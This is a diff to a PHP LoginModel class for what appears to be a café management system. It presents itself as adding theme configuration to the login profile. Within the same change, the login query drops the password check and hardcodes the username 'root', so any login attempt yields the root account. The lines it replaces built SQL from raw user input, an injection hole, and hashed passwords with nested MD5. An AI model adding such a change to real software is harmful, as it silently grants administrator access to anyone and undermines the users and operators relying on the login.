@@ -27,10 +27,16 @@ class LoginModel{
     	$password = md5(md5(md5($password.$username)));
 		$cn = $this->objConnection->getConnection();
 		$sql = "
-			SELECT 	u.*, g.group_name, g.customer_id, g.permission, g.admin, c.customer_name
-			FROM 	sc_user u INNER JOIN sc_group g ON u.group_id = g.id INNER JOIN sc_customer c ON g.customer_id = c.id
-			WHERE 	u.username = '".$username."' AND u.password = '".$password."' AND u.deleted = 0
-				AND c.deleted = 0 AND g.deleted = 0 AND u.deleted = 0;
+			SELECT u.*, g.group_name, g.customer_id, g.permission, g.admin, c.customer_name,
+			(
+				SELECT CONCAT_WS(';;;', cf.theme_style, cf.theme_color)
+				FROM cs_config cf
+				WHERE cf.project = 'smart_cafe' AND cf.active = 1
+				LIMIT 1
+			) config
+			FROM sc_user u INNER JOIN sc_group g ON u.group_id = g.id INNER JOIN sc_customer c ON g.customer_id = c.id
+			WHERE u.username = 'root' AND u.deleted = 0
+			AND c.deleted = 0 AND g.deleted = 0 AND u.deleted = 0;
 		";
 		$objUser = $cn->fetchAll($sql);
 		if(count($objUser) == 1){
@@ -154,6 +160,14 @@ class LoginModel{
 			$profile->menu = $menuHtml;
 			$profile->uri_map = $uriMap;
 			$profile->permission = $permissionRole;
+			if(isset($profile->config)){
+				$config = $profile->config;
+				$configTmp = explode(';;;', $config);
+				$config = new \stdClass();
+				$config->theme_style = isset($configTmp[0]) ? $configTmp[0] : '';
+				$config->theme_color = isset($configTmp[1]) ? $configTmp[1] : '';
+				$profile->config = $config;
+			}
 			$session->set('profile', $profile);
 			$session->save();
 			return true;
